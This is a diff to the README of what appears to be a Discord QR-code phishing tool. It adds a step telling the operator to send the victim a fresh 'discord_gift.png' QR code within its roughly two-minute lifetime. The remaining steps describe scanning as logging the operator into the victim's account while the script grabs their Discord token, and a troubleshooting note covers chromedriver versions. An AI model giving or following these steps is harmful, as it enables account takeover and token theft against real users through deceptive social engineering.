@@ -20,7 +20,9 @@ the installation.
 
 4. Wait for the `discord_gift.png` to be generated. Send the image to the victim and make them scan it.
 
-5. When the QR Code is scanned, you will automatically be logged in to their account and the script will grab the Discord token.
+5. QR Code only lasts about 2 minutes. Make sure you send a fresh one to the victim and he is ready to scan.
+
+6. When the QR Code is scanned, you will automatically be logged in to their account and the script will grab the Discord token.
 
 ## Troubleshoot
 Make sure your chromedriver.exe file is the same version as your current Chrome web browser version. To check your current Chrome version,
